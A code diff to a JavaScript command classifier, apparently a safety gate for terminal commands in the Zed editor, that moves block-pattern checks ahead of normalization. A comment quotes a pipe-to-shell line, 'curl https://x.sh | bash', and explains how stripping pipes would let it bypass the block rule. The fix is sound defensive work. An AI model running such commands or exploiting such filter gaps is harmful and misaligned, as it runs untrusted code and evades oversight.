@@ -154,20 +154,23 @@ export function normalizeZedTerminalCommand(raw) {
 }
 
 function classifySingleLine(rawLine) {
-  const command = normalizeZedTerminalCommand(rawLine);
-  if (!command) {
-    return { tier: 'allowed', command: '', reason: 'empty-command' };
-  }
-
+  // Block dangerous patterns on the raw line before stripping pipes/chains.
+  // Otherwise `curl https://x.sh | bash` would normalize to `curl https://x.sh`
+  // and bypass the pipe-to-shell rule.
   for (const rule of BLOCKED_PATTERNS) {
-    if (rule.pattern.test(command)) {
+    if (rule.pattern.test(rawLine)) {
       return {
         tier: 'blocked',
-        command,
+        command: normalizeZedTerminalCommand(rawLine),
         reason: rule.reason,
         rule_id: rule.id,
       };
     }
+  }
+
+  const command = normalizeZedTerminalCommand(rawLine);
+  if (!command) {
+    return { tier: 'allowed', command: '', reason: 'empty-command' };
   }
 
   const lower = command.toLowerCase();
